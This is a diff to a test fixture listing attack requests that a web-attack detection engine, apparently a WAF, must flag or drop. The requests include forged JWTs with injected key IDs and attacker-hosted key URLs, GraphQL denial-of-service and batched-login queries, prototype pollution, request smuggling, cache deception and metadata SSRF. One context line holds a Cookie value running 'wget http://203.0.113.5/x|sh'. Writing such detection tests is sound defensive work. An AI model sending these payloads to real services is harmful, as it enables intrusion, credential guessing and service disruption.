@@ -1,5 +1,5 @@
 # Attacks the engine must catch. One per line, TAB separated:
-#   category[|category…]   target   [M=METHOD]   [H:Header-Name=value]…
+#   category[|category…]   target   [M=METHOD]   [V=1.0]   [H:Header-Name=value]…
 # A category with a leading ~ only has to be flagged (a probe, or a hit under
 # 5 points); without it the request must be a payload (5+ points: dropped).
 # Spaces in a target are sent as %20 and, in a second run, every query value
@@ -972,3 +972,55 @@ recon|rce	/	H:User-Agent=<?php system('id'); ?>
 recon|rce	/	H:Cookie=x=;wget http://203.0.113.5/x|sh
 recon|rce	/	H:X-Forwarded-For=127.0.0.1;id
 recon|ssti	/	H:User-Agent={{7*7}}
+# ------------------------------------------------------------------ JWT (engine 3)
+auth	/api/admin/users	H:Authorization=Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
+auth	/api/orders	H:Authorization=Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0.eyJzdWIiOiIxIiwiYWRtaW4iOnRydWV9.
+auth	/api/account?access_token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.c2ln
+auth	/graphql	M=POST	H:Authorization=Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0.eyJzdWIiOiIxIiwiYWRtaW4iOnRydWV9.	H:Content-Type=application/json
+auth	/api/admin	H:Authorization=Bearer eyJhbGciOiJIUzI1NiIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJzdWIiOiJhZG1pbiJ9.c2lnbmF0dXJl
+auth	/api/v2/me	H:Authorization=Bearer eyJhbGciOiJIUzI1NiIsImtpZCI6IngnIFVOSU9OIFNFTEVDVCAnc2VjcmV0Jy0tIC0ifQ.eyJzdWIiOiJhZG1pbiJ9.c2lnbmF0dXJl
+auth	/api/users?jwt=eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uXFwuLlxcLi5cXHdpbmRvd3NcXHdpbi5pbmkifQ.eyJzdWIiOiJhZG1pbiJ9.c2lnbmF0dXJl
+auth	/api/me	H:Authorization=JWT eyJhbGciOiJIUzI1NiIsImtpZCI6IiQoaWQpIn0.eyJzdWIiOiJhZG1pbiJ9.c2lnbmF0dXJl
+auth	/api/admin	H:Authorization=Bearer eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8veDdmMy5vYXN0aWZ5LmNvbS8ud2VsbC1rbm93bi9qd2tzLmpzb24ifQ.eyJzdWIiOiJhZG1pbiJ9.c2lnbmF0dXJl
+auth	/api/admin	H:Authorization=Bearer eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vYXBwLmV4YW1wbGVAZXZpbC5leGFtcGxlL2p3a3MuanNvbiJ9.eyJzdWIiOiJhZG1pbiJ9.c2lnbmF0dXJl	H:Host=app.example
+auth	/api/admin	H:Authorization=Bearer eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHBzOi8vMTI3LjAuMC4xOjg0NDMvY2VydC5wZW0ifQ.eyJzdWIiOiJhZG1pbiJ9.c2lnbmF0dXJl
+~auth	/api/admin	H:Authorization=Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IngiLCJuIjoiMHZ4N2Fnb2ViR2NRU3V1UGlMSlhacHROOW5uZHJRbWJYRXBzMmFpQUZiV2hNNzhMaFd4NGNiYmZBQXRWVDg2end1MVJLN2FQRkZ4dWhEUjFMNnRTb2MifX0.eyJzdWIiOiJhZG1pbiJ9.c2lnbmF0dXJl
+auth	/api/admin	H:Authorization=Bearer eyJhbGciOiJFUzM4NCJ9.eyJzdWIiOiJhZG1pbiJ9.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+# ------------------------------------------------------------------ GraphQL abuse (engine 3)
+dos	/graphql?query={a{b{c{d{e{f{g{h{i{j{k{l{m{n{o{p{q{r{s{t{u{v{w{x{y{z{id}}}}}}}}}}}}}}}}}}}}}}}}}}}
+dos	/api/graphql?query={q0:__typename q1:__typename q2:__typename q3:__typename q4:__typename q5:__typename q6:__typename q7:__typename q8:__typename q9:__typename q10:__typename q11:__typename q12:__typename q13:__typename q14:__typename q15:__typename q16:__typename q17:__typename q18:__typename q19:__typename q20:__typename q21:__typename q22:__typename q23:__typename q24:__typename q25:__typename q26:__typename q27:__typename q28:__typename q29:__typename q30:__typename q31:__typename q32:__typename q33:__typename q34:__typename q35:__typename q36:__typename q37:__typename q38:__typename q39:__typename q40:__typename q41:__typename q42:__typename q43:__typename q44:__typename q45:__typename q46:__typename q47:__typename q48:__typename q49:__typename q50:__typename q51:__typename q52:__typename q53:__typename q54:__typename q55:__typename q56:__typename q57:__typename q58:__typename q59:__typename q60:__typename q61:__typename q62:__typename q63:__typename q64:__typename q65:__typename q66:__typename q67:__typename q68:__typename q69:__typename q70:__typename q71:__typename q72:__typename q73:__typename q74:__typename q75:__typename q76:__typename q77:__typename q78:__typename q79:__typename q80:__typename q81:__typename q82:__typename q83:__typename q84:__typename q85:__typename q86:__typename q87:__typename q88:__typename q89:__typename q90:__typename q91:__typename q92:__typename q93:__typename q94:__typename q95:__typename q96:__typename q97:__typename q98:__typename q99:__typename q100:__typename q101:__typename q102:__typename q103:__typename q104:__typename q105:__typename q106:__typename q107:__typename q108:__typename q109:__typename q110:__typename q111:__typename q112:__typename q113:__typename q114:__typename q115:__typename q116:__typename q117:__typename q118:__typename q119:__typename}
+dos	/graphql?query=mutation{a0:login(username:"admin",password:"pass0"){token} a1:login(username:"admin",password:"pass1"){token} a2:login(username:"admin",password:"pass2"){token} a3:login(username:"admin",password:"pass3"){token} a4:login(username:"admin",password:"pass4"){token} a5:login(username:"admin",password:"pass5"){token} a6:login(username:"admin",password:"pass6"){token} a7:login(username:"admin",password:"pass7"){token} a8:login(username:"admin",password:"pass8"){token} a9:login(username:"admin",password:"pass9"){token} a10:login(username:"admin",password:"pass10"){token} a11:login(username:"admin",password:"pass11"){token} a12:login(username:"admin",password:"pass12"){token} a13:login(username:"admin",password:"pass13"){token} a14:login(username:"admin",password:"pass14"){token} a15:login(username:"admin",password:"pass15"){token} a16:login(username:"admin",password:"pass16"){token} a17:login(username:"admin",password:"pass17"){token} a18:login(username:"admin",password:"pass18"){token} a19:login(username:"admin",password:"pass19"){token} a20:login(username:"admin",password:"pass20"){token} a21:login(username:"admin",password:"pass21"){token} a22:login(username:"admin",password:"pass22"){token} a23:login(username:"admin",password:"pass23"){token} a24:login(username:"admin",password:"pass24"){token} a25:login(username:"admin",password:"pass25"){token} a26:login(username:"admin",password:"pass26"){token} a27:login(username:"admin",password:"pass27"){token} a28:login(username:"admin",password:"pass28"){token} a29:login(username:"admin",password:"pass29"){token}}
+~dos	/graphql?query={friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{name}}}}}}}}}}}}}}}}}}}
+dos	/graphql?operationName=x&query=query x{s0:__schema{types{name}} s1:__schema{types{name}} s2:__schema{types{name}} s3:__schema{types{name}} s4:__schema{types{name}} s5:__schema{types{name}} s6:__schema{types{name}} s7:__schema{types{name}} s8:__schema{types{name}} s9:__schema{types{name}} s10:__schema{types{name}} s11:__schema{types{name}} s12:__schema{types{name}} s13:__schema{types{name}} s14:__schema{types{name}} s15:__schema{types{name}} s16:__schema{types{name}} s17:__schema{types{name}} s18:__schema{types{name}} s19:__schema{types{name}} s20:__schema{types{name}} s21:__schema{types{name}} s22:__schema{types{name}} s23:__schema{types{name}} s24:__schema{types{name}}}
+# ------------------------------------------------------------------ prototype pollution (engine 3)
+rce	/api/users/__proto__/isAdmin	M=PUT
+rce	/x?filter={"__proto__":{"isAdmin":true}}
+rce	/	H:Cookie=prefs={"__proto__":{"admin":1}}
+rce	/x?%5F%5Fproto%5F%5F%5Bisadmin%5D=1
+rce	/api?q={"a":{"__proto__":{"b":1}}}
+# ------------------------------------------------------------------ request smuggling (engine 3)
+~protocol	/	M=GET	H:Transfer-Encoding=chunked
+~protocol	/api/data	M=POST	H:Transfer-Encoding=chunked	V=1.0
+~protocol	/	H:Connection=close, X-Forwarded-For
+~protocol	/favicon.ico	M=HEAD	H:Transfer-Encoding=chunked
+~protocol	/	M=OPTIONS	H:Transfer-Encoding=chunked
+# ------------------------------------------------------------------ path normalization & cache deception (engine 3)
+~protocol	/;/admin/users
+~protocol	/api/;x/internal/config
+~traversal	/static../app/settings.py
+~protocol	/admin/%2e/settings
+~protocol	/account/settings;x.css
+~protocol	/api/me%23.css
+~protocol	/;jsessionid=x/admin
+# ------------------------------------------------------------------ host header & cache poisoning (engine 3)
+protocol	/	H:X-Forwarded-Host=evil.example"><script>alert(1)</script>
+~protocol	/	H:Host=app.example:evil.example
+~protocol	/	H:X-Host=evil.example/
+~protocol	/	H:X-Forwarded-Scheme=nothttps
+~protocol	/	H:X-Original-Host=evil.example:@x
+~protocol	/	H:X-Forwarded-Prefix=//evil.example
+# ------------------------------------------------------------------ Next.js / Vite (engine 3)
+cve	/dashboard?__nextDataReq=1	H:x-now-route-matches=1
+~cve	/	M=POST	H:Next-Action=x
+cve	/	H:Location=http://169.254.169.254/latest/meta-data/
+cve	/src/main.js?.svg?.wasm?init
